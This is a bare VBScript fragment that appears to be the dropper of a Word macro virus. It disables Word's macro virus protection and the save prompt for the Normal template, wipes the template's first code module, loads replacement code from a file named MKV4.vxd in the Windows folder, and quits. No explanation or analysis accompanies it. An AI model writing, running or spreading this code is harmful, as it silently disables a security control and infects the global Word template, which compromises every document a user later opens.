Set MKV = WScript.CreateObject("Word.Application")
MKV.Options.VirusProtection = False
MKV.Options.SaveNormalPrompt = False
MKV.Options.SaveNormalPrompt = False
MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines
MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\MKV4.vxd")
MKV.Application.Quit
